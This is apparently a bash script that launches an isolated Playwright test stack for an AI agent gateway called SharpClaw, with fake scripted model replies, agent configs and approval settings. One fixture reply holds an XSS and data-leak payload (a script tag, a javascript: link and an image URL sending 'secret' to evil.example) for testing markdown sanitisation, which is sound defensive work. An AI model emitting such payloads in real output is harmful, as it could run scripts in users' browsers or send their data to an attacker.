#!/usr/bin/env bash
# Starts an isolated SharpClaw stack for the Playwright suite: the gateway (fake provider, built UI)
# and two agent processes (assistant, and helper, which assistant may ask with ask_agent), on spare ports with a throwaway database. It never touches a running
# Compose stack. Usage: e2e/stack.sh start|stop. State lives in $E2E_STATE_DIR.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
STATE="${E2E_STATE_DIR:-${TMPDIR:-/tmp}/sharpclaw-e2e}"
CLIENT_PORT="${E2E_CLIENT_PORT:-18480}"
AGENT_PORT="${E2E_AGENT_PORT:-18481}"
ADMIN_KEY="e2e-admin-key"
BASE="http://127.0.0.1:$CLIENT_PORT"

stop() {
  for pidfile in "$STATE"/*.pid; do
    [ -f "$pidfile" ] || continue
    kill "$(cat "$pidfile")" 2>/dev/null || true
    rm -f "$pidfile"
  done
}

if [ "${1:-}" = "stop" ]; then
  stop
  exit 0
fi

stop
rm -rf "$STATE"
mkdir -p "$STATE/config" "$STATE/workspace/notes"

dotnet build "$ROOT/src/SharpClaw.Gateway" -c Release -v quiet -nologo >/dev/null
dotnet build "$ROOT/src/SharpClaw.Agent" -c Release -v quiet -nologo >/dev/null
dotnet build "$ROOT/src/SharpClaw.Cli" -c Release -v quiet -nologo >/dev/null

# Scripted replies: streaming, tool use needing approval, markdown safety, a long reply, and one
# agent asking another (assistant asks helper; helper sees the question with its sender prefix).
cat >"$STATE/script.json" <<'JSON'
{
  "rules": [
    { "match": "^ask the helper", "role": "user", "response": "Asking the helper.", "toolCalls": [
      { "name": "ask_agent", "arguments": { "agent": "helper", "message": "What is 2+2?" } } ] },
    { "match": "^\\[Message from agent assistant\\]", "role": "user", "response": "The answer is 4." },
    { "match": "\"reply\":\"The answer is 4.\"", "role": "tool", "response": "The helper says the answer is 4." },
    { "match": "^delete the note", "role": "user", "response": "Deleting it.", "toolCalls": [
      { "name": "workspace_delete", "arguments": { "path": "notes/old.md" } } ] },
    { "match": "^read then delete", "role": "user", "response": "Reading it first.", "toolCalls": [
      { "name": "workspace_read", "arguments": { "path": "notes/crit.md" } } ] },
    { "match": "critical note", "role": "tool", "response": "Now deleting it.", "toolCalls": [
      { "name": "workspace_delete", "arguments": { "path": "notes/crit.md" } } ] },
    { "match": ".*", "role": "tool", "response": "The tool step is finished." },
    { "match": "^slow", "response": "This reply streams slowly so a reload can land in the middle of it, and the rest should continue without any duplication at all. The end.", "chunkSize": 4, "delayMs": 120 },
    { "match": "^markdown", "response": "**bold** <script>window.__pwned = 1</script> ![leak](https://evil.example/leak.png?d=secret) [bad](javascript:alert(1)) [ok](https://example.com)" },
    { "match": ".*", "response": "Hello from the fake provider.", "chunkSize": 6, "delayMs": 30 }
  ]
}
JSON

# Anything above low risk needs approval; no smart mode (it would cost an extra model call).
# Workspace reads taint the turn so a read-then-delete reaches critical (tools.spec.ts).
cat >"$STATE/config/agent.json" <<'JSON'
{ "allowedRiskLevel": "low", "smartMode": false, "maxToolIterations": 5, "taintWorkspaceReads": true,
  "tools": ["workspace_list", "workspace_read", "workspace_write", "workspace_delete", "ask_agent"] }
JSON
printf 'You are a test agent.\n' >"$STATE/config/soul.md"
mkdir -p "$STATE/helper/config" "$STATE/helper/workspace"
printf 'You are a helper agent.\n' >"$STATE/helper/config/soul.md"
printf 'old note\n' >"$STATE/workspace/notes/old.md"

GATEWAY_DLL="$ROOT/src/SharpClaw.Gateway/bin/Release/net10.0/SharpClaw.Gateway.dll"
(
  cd "$STATE"
  Auth__AdminKey="$ADMIN_KEY" Provider__Type=Fake Fake__ScriptPath="$STATE/script.json" \
  Database__Path="$STATE/sharpclaw.db" Listeners__ClientPort="$CLIENT_PORT" Listeners__AgentPort="$AGENT_PORT" \
  Ui__RootPath="$ROOT/ui/dist" Approvals__TimeoutSeconds="${E2E_APPROVAL_TIMEOUT:-25}" Approvals__SweepIntervalSeconds=1 \
  Context__ReplyReserveTokens=100 Models__Allowed__0=fake/other Logging__LogLevel__Default=Warning \
  ToolBroker__Agents__assistant__Tools__0=ask_agent AgentMessaging__Allowed__assistant__0=helper \
  AgentMessaging__Descriptions__helper="Answers questions." \
    exec dotnet "$GATEWAY_DLL" >"$STATE/gateway.log" 2>&1
) &
echo $! >"$STATE/gateway.pid"

for _ in $(seq 1 60); do
  curl -fsS "$BASE/healthz" >/dev/null 2>&1 && break
  sleep 0.5
done
curl -fsS "$BASE/healthz" >/dev/null

# The first user, created with the CLI as the README describes.
CLI_DLL="$ROOT/src/SharpClaw.Cli/bin/Release/net10.0/sharpclaw.dll"
printf '%s\n' "${E2E_PASSWORD:-e2e password 1234}" | SHARPCLAW_URL="$BASE" SHARPCLAW_ADMIN_KEY="$ADMIN_KEY" \
  dotnet "$CLI_DLL" users create "${E2E_USER:-kevin}" --password-stdin >/dev/null

# The helper first, so it is in the assistant's ask_agent recipients when the assistant starts.
HELPER_TOKEN=$(curl -fsS -X POST "$BASE/api/agents" -H "Authorization: Bearer $ADMIN_KEY" -H 'Content-Type: application/json' \
  -d '{"name":"helper","model":"fake/model","dailyBudgetUsd":5}' | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).token.value))')

TOKEN=$(curl -fsS -X POST "$BASE/api/agents" -H "Authorization: Bearer $ADMIN_KEY" -H 'Content-Type: application/json' \
  -d '{"name":"assistant","model":"fake/model","dailyBudgetUsd":5}' | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).token.value))')

(
  GATEWAY_URL="http://127.0.0.1:$AGENT_PORT" AGENT_TOKEN="$TOKEN" SOUL_PATH="$STATE/config/soul.md" \
  WORKSPACE_PATH="$STATE/workspace" AGENT_CONFIG_PATH="$STATE/config/agent.json" LONG_POLL_SECONDS=5 LOG_LEVEL=Warning \
    exec dotnet "$ROOT/src/SharpClaw.Agent/bin/Release/net10.0/SharpClaw.Agent.dll" >"$STATE/agent.log" 2>&1
) &
echo $! >"$STATE/agent.pid"

(
  GATEWAY_URL="http://127.0.0.1:$AGENT_PORT" AGENT_TOKEN="$HELPER_TOKEN" SOUL_PATH="$STATE/helper/config/soul.md" \
  WORKSPACE_PATH="$STATE/helper/workspace" AGENT_CONFIG_PATH="$STATE/helper/config/agent.json" LONG_POLL_SECONDS=5 \
  LOG_LEVEL=Warning exec dotnet "$ROOT/src/SharpClaw.Agent/bin/Release/net10.0/SharpClaw.Agent.dll" >"$STATE/helper.log" 2>&1
) &
echo $! >"$STATE/helper.pid"

echo "stack ready on $BASE"
